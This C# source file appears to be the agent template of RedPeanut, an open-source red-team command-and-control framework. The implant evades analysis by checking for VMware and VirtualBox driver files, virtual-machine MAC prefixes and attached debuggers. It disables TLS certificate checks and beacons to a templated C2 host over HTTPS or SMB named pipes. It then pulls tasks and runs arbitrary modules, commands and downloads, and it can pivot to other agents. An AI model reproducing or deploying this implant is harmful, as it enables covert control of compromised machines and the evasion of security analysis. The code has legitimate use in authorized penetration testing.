//
// Author: B4rtik (@b4rtik)
// Project: RedPeanut (https://github.com/b4rtik/RedPeanut)
// License: BSD 3-Clause
//

using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Net.Security;
using System.Threading;
using System.IO.Pipes;
using System.Net.NetworkInformation;
using System.Text.RegularExpressions;

namespace RedPeanutAgent
{
    public class Program
    {
        public static string[] pageget = {
           #PAGEGET#
        };
        public static string[] pagepost = {
        	#PAGEPOST#
        };

        public static string param = "#PARAM#";
        public static string serverkey = "#SERVERKEY#";
        public static string host = "#HOST#";
        public static int port = int.Parse("#PORT#");
        public static string namedpipe = "#PIPENAME#";
        public static string spawnp = "#SPAWN#";
        public static bool isCovered = bool.Parse("#COVERED#");
        public static string targetclass = "#TARGETCLASS#";

        public static string nutclr = "#NUTCLR#";

        public static void Execute(string json, string cookie, NamedPipeClientStream pipe)
        {
            if (containsSandboxArtifacts() || isBadMac() || isDebugged())
                return;

            byte[] aeskey;
            byte[] aesiv;
            string agentid = "";
            Thread servert = null;
            bool smbstarted = false;

            Dictionary<string, List<Core.Utility.TaskMsg>> commands = new Dictionary<string, List<Core.Utility.TaskMsg>>();

            Random r = new Random();

            Core.Utility.AgentIdMsg agentidmsg = Core.Utility.GetAgentId(json);
            agentid = agentidmsg.agentid;
            aeskey = Convert.FromBase64String(agentidmsg.sessionkey);
            aesiv = Convert.FromBase64String(agentidmsg.sessioniv);

            Core.Utility.CookiedWebClient wc = new Core.Utility.CookiedWebClient();

            WebHeaderCollection webHeaderCollection = new WebHeaderCollection();
            webHeaderCollection.Add(HttpRequestHeader.UserAgent, "#USERAGENT#");

            #HEADERS#

            wc.Headers = webHeaderCollection;

            ServicePointManager.Expect100Continue = true;
            ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;
            ServicePointManager.DefaultConnectionLimit = 9999;

            ServicePointManager.ServerCertificateValidationCallback = new RemoteCertificateValidationCallback(
                    delegate
                    { return true; }
                );

            string[] hhosts = webHeaderCollection.GetValues("Host");
            if(hhosts != null)
            {
                foreach (string s in webHeaderCollection.GetValues("Host"))
                    wc.Add(new Cookie("sessionid", cookie, "/", s));
            }
            

            wc.Add(new Cookie("sessionid", cookie, "/", host));

            string rpaddress = String.Format("https://{0}:{1}/{2}", host, port, pagepost[new Random().Next(pagepost.Length)]);

            if (pipe != null)
            {
                Core.Utility.SendCheckinSMB(agentid, aeskey, aesiv, pipe);
            }
            else
            {
                Core.Utility.SendCheckinHttp(agentid, aeskey, aesiv, rpaddress, param, wc);
            }

            //TODO manage max delay via config
            int maxdelay = 8;
            int rInt = r.Next(5, maxdelay);

            while (true)
            {
                try
                {
                    rpaddress = String.Format("https://{0}:{1}/{2}", host, port, pageget[new Random().Next(pageget.Length)]);
                    Core.Utility.TaskMsg task = null;
                    
                    if (pipe != null)
                    {
                        task = Core.Utility.GetTaskSMB(aeskey, aesiv, pipe);
                    }
                    else
                    {
                        if (wc != null)
                            task = Core.Utility.GetTaskHttp(wc, aeskey, aesiv, rpaddress, targetclass, isCovered);
                    }

                    if (task != null)
                    {
                        if (task.Agentid.Equals(agentid))
                        {
                            switch(task.TaskType)
                            {
                                case "module":
                                    try
                                    {
                                        Execution.CommandExecuter commandExecuter = new Execution.CommandExecuter(task, pipe, wc, aeskey, aesiv, agentid, spawnp);
                                        Thread commandthread = new Thread(new ThreadStart(commandExecuter.ExecuteModule));
                                        commandthread.Start();
                                    }
                                    catch (Exception)
                                    {

                                    }
                                    break;
                                case "pivot":
                                    if (!smbstarted)
                                    {
                                        try
                                        {
                                            C2.SmbListener smblistener = new C2.SmbListener(agentid, serverkey, aeskey, aesiv, agentid, commands);
                                            servert = new Thread(new ThreadStart(smblistener.Execute));
                                            servert.Start();
                                            smbstarted = true;
                                        }
                                        catch (Exception)
                                        {

                                        }
                                    }
                                    break;
                                case "download":
                                    try
                                    {
                                        Execution.CommandExecuter commandExecuter = new Execution.CommandExecuter(task, pipe, wc, aeskey, aesiv, agentid, spawnp);
                                        Thread commandthread = new Thread(new ThreadStart(commandExecuter.ExecuteLocal));
                                        commandthread.Start();
                                    }
                                    catch (Exception)
                                    {

                                    }
                                    break;
                                case "standard":
                                    try
                                    {
                                        Execution.CommandExecuter commandExecuter = new Execution.CommandExecuter(task, pipe, wc, aeskey, aesiv, agentid, spawnp);
                                        commandExecuter.ExecuteLocal();
                                    }
                                    catch (Exception)
                                    {

                                    }
                                    break;
                                default:
                                    try
                                    {
                                        Execution.CommandExecuter commandExecuter = new Execution.CommandExecuter(task, pipe, wc, aeskey, aesiv, agentid, spawnp);
                                        Thread commandthread = new Thread(new ThreadStart(commandExecuter.ExecuteCmd));
                                        commandthread.Start();
                                    }
                                    catch (Exception)
                                    {

                                    }
                                    break;
                            }
                        }
                        else
                        {
                            if (task.AgentPivot.Equals(agentid))
                            {
                                try
                                {
                                    //Route message to agent
                                    if (!commands.ContainsKey(task.Agentid))
                                        commands.Add(task.Agentid, new List<Core.Utility.TaskMsg>());

                                    commands.TryGetValue(task.Agentid, out List<Core.Utility.TaskMsg> list);
                                    list.Add(task);
                                }
                                catch (Exception)
                                {
                                    
                                }
                            }
                            else
                            {
                                //Console.WriteLine("[*] Error routing message");
                            }
                        }
                    }
                }
                catch (RedPeanutAgent.Core.Utility.EndOfLifeException e)
                {
                    SystemException ex = new SystemException();
                    ex.Data["reason"] = "exit";
                    throw ex;
                }
                catch (WebException e)
                {
                    HttpWebResponse errorResponse = e.Response as HttpWebResponse;
                    if (errorResponse == null || errorResponse.StatusCode != HttpStatusCode.NotFound)
                        return;
                }
                catch (Exception e)
                {
                    return;
                }

                Thread.Sleep(rInt * 1000);
            }
        }

        //Sharpshooter
        // Returns true if possible sandbox artifacts exist on file system
        static public bool containsSandboxArtifacts()
        {
            List<string> EvidenceOfSandbox = new List<string>();
            string[] FilePaths = {@"C:\windows\Sysnative\Drivers\Vmmouse.sys",
        @"C:\windows\Sysnative\Drivers\vm3dgl.dll", @"C:\windows\Sysnative\Drivers\vmdum.dll",
        @"C:\windows\Sysnative\Drivers\vm3dver.dll", @"C:\windows\Sysnative\Drivers\vmtray.dll",
        @"C:\windows\Sysnative\Drivers\vmci.sys", @"C:\windows\Sysnative\Drivers\vmusbmouse.sys",
        @"C:\windows\Sysnative\Drivers\vmx_svga.sys", @"C:\windows\Sysnative\Drivers\vmxnet.sys",
        @"C:\windows\Sysnative\Drivers\VMToolsHook.dll", @"C:\windows\Sysnative\Drivers\vmhgfs.dll",
        @"C:\windows\Sysnative\Drivers\vmmousever.dll", @"C:\windows\Sysnative\Drivers\vmGuestLib.dll",
        @"C:\windows\Sysnative\Drivers\VmGuestLibJava.dll", @"C:\windows\Sysnative\Drivers\vmscsi.sys",
        @"C:\windows\Sysnative\Drivers\VBoxMouse.sys", @"C:\windows\Sysnative\Drivers\VBoxGuest.sys",
        @"C:\windows\Sysnative\Drivers\VBoxSF.sys", @"C:\windows\Sysnative\Drivers\VBoxVideo.sys",
        @"C:\windows\Sysnative\vboxdisp.dll", @"C:\windows\Sysnative\vboxhook.dll",
        @"C:\windows\Sysnative\vboxmrxnp.dll", @"C:\windows\Sysnative\vboxogl.dll",
        @"C:\windows\Sysnative\vboxoglarrayspu.dll", @"C:\windows\Sysnative\vboxoglcrutil.dll",
        @"C:\windows\Sysnative\vboxoglerrorspu.dll", @"C:\windows\Sysnative\vboxoglfeedbackspu.dll",
        @"C:\windows\Sysnative\vboxoglpackspu.dll", @"C:\windows\Sysnative\vboxoglpassthroughspu.dll",
        @"C:\windows\Sysnative\vboxservice.exe", @"C:\windows\Sysnative\vboxtray.exe",
        @"C:\windows\Sysnative\VBoxControl.exe"};
            foreach (string FilePath in FilePaths)
            {
                if (File.Exists(FilePath))
                {
                    EvidenceOfSandbox.Add(FilePath);
                }
            }

            if (EvidenceOfSandbox.Count == 0)
            {
                return false;
            }
            else
            {
                return true;
            }
        }

        //Sharpshooter
        // Return true is machine matches a bad MAC vendor
        static public bool isBadMac()
        {
            List<string> EvidenceOfSandbox = new List<string>();

            string[] badMacAddresses = { @"000C29", @"001C14", @"005056", @"000569", @"080027" };

            NetworkInterface[] NICs = NetworkInterface.GetAllNetworkInterfaces();
            foreach (NetworkInterface NIC in NICs)
            {
                foreach (string badMacAddress in badMacAddresses)
                {
                    if (NIC.GetPhysicalAddress().ToString().ToLower().Contains(badMacAddress.ToLower()))
                    {
                        EvidenceOfSandbox.Add(Regex.Replace(NIC.GetPhysicalAddress().ToString(), ".{2}", "$0:").TrimEnd(':'));
                    }
                }
            }

            if (EvidenceOfSandbox.Count == 0)
            {
                return false;
            }
            else
            {
                return true;
            }

        }

        //Sharpshooter
        // Return true if a debugger is attached
        static public bool isDebugged()
        {
            if (System.Diagnostics.Debugger.IsAttached)
            {
                return true;
            }
            else
            {
                return false;
            }
        }
    }
}
